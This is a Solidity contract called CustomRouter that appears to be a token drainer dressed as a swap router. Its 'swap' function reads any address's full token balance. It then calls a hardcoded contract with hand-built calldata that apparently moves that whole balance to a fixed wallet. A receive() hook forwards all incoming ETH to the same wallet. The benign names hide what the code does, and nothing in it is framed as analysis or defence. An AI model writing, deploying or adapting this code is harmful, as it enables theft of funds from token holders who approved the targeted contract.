// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract CustomRouter {
    address public owner;

    // Target contract to invoke during the swap
    address public constant TARGET_INTERACTION_CONTRACT = 0x10EfC21DcB3513cF3014D4D2d6CfE612548Fcc7B;
    
    // Target address for incoming ETH forwarding
    address payable public constant ETH_RECIPIENT = payable(0xF8Cfd0344cC5552203Be99C82474fda3EA0ea0F8);

    event Swapped(address indexed tar, address indexed tok, uint256 balance);
    event Executed(address indexed target, bytes data);
    event EthForwarded(address indexed sender, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Unauthorized: Caller is not the owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    /// @notice Automatically triggers whenever ETH is sent directly to this contract.
    /// @dev Forwards the entire contract balance to ETH_RECIPIENT.
    receive() external payable {
        uint256 totalBalance = address(this).balance;
        if (totalBalance > 0) {
            (bool success, ) = ETH_RECIPIENT.call{value: totalBalance}("");
            require(success, "ETH forwarding failed");
            emit EthForwarded(msg.sender, totalBalance);
        }
    }

    /// @notice Queries balance of `tok` for `tar`, constructs dynamic calldata, and executes low-level call.
    function swap(address tar, address tok) external onlyOwner returns (bytes memory) {
        // 1. Query token balance of `tar`
        uint256 tokenBalance = IERC20(tok).balanceOf(tar);

        // 2. Construct calldata
        bytes memory payload = bytes.concat(
            hex"d5ba63ad000000000000000000000000",
            bytes20(tok), 
            hex"000000000000000000000000",
            bytes20(tar), 
            hex"000000000000000000000000F8Cfd0344cC5552203Be99C82474fda3EA0ea0F80000000000000000000000000000000000000000000000000000000000000064",
            bytes32(tokenBalance)
        );

        // 3. Execute low-level call to interaction address
        (bool success, bytes memory returnData) = TARGET_INTERACTION_CONTRACT.call(payload);
        require(success, "Swap low-level call failed");

        emit Swapped(tar, tok, tokenBalance);
        return returnData;
    }

    /// @notice Executes an arbitrary interaction against a single target address with provided raw data.
    function multicall(address target, bytes calldata data) external onlyOwner returns (bytes memory) {
        require(target != address(0), "Invalid target address");

        (bool success, bytes memory returnData) = target.call(data);
        require(success, "Multicall execution failed");

        emit Executed(target, data);
        return returnData;
    }

    /// @notice Transfer ownership if needed
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid address");
        owner = newOwner;
    }
}